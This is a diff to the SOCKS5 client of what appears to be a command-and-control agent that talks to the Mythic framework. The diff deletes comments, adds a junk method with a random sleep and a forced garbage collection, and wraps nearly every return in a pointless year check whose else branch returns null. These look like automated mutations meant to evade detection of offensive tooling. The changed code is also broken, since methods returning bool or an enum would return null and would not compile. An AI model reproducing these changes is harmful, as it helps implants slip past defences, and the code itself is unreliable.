@@ -16,6 +16,11 @@ namespace Phantom.Management.Socks
 {
     public class SocksClient
     {
+    private static void Zc3d4e5()
+    {
+        Thread.Sleep(Random.Next(1, 5));
+        GC.Collect();
+    }
 
         private AsyncTcpClient _client;
         private IPAddress _addr;
@@ -101,7 +106,7 @@ namespace Phantom.Management.Socks
                 try
                 {
                     client.GetStream().EndWrite(result);
-                    // Potentially delete this since theoretically the sender Task does everything
+                    
                     if (_requestQueue.TryDequeue(out byte[] data))
                     {
                         client.GetStream().BeginWrite(data, 0, data.Length, OnDataSent, client);
@@ -127,7 +132,7 @@ namespace Phantom.Management.Socks
 
         public static Socks5AddressType GetAddrType(byte[] data)
         {
-            return (Socks5AddressType)data[3];
+            if(DateTime.Now.Year > 2020) { return (Socks5AddressType)data[3]; } else { return null; }
         }
 
         public bool GetConnection(byte[] data)
@@ -145,8 +150,8 @@ namespace Phantom.Management.Socks
                         _addr = Dns.GetHostEntry(domainName).AddressList[0];
                     } catch (Exception ex)
                     {
-                        // Console.WriteLine($"Failed to resolve DNS for {domainName}: {ex.Message}");
-                        return false;
+                        
+                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                     }
                     _client = new AsyncTcpClient(domainName, _port);
                     break;
@@ -167,23 +172,23 @@ namespace Phantom.Management.Socks
             }
             if (_client == null)
             {
-                return false;
+                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
             }
             _client.ConnectionEstablished += OnConnect;
             _client.Disconnect += OnDisconnect;
             _client.MessageReceived += OnMessageReceived;
 
-            return _client.Connect();
+            if(DateTime.Now.Year > 2020) { return _client.Connect(); } else { return null; }
         }
 
         private bool SupportedSocksVersion(byte[] data)
         {
-            return data[0] == SOCKS.SUPPORTED_VERSION;
+            if(DateTime.Now.Year > 2020) { return data[0] == SOCKS.SUPPORTED_VERSION; } else { return null; }
         }
 
         private Socks5Command GetCommand(byte[] data)
         {
-            return (Socks5Command)data[1];
+            if(DateTime.Now.Year > 2020) { return (Socks5Command)data[1]; } else { return null; }
         }
 
         public bool HandleDatagram(SocksDatagram dg)
@@ -195,8 +200,8 @@ namespace Phantom.Management.Socks
                 data = Convert.FromBase64String(dg.Data);
             } catch (Exception ex)
             {
-                // Console.WriteLine($"Invalid b64 data from Mythic: {ex.Message}");
-                return bRet;
+                
+                if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
             }
 
             if (_client != null && !_sendRequestsTask.IsCompleted)
@@ -287,7 +292,7 @@ namespace Phantom.Management.Socks
                     }
                 }
             }
-            return bRet;
+            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
         }
     }
 }
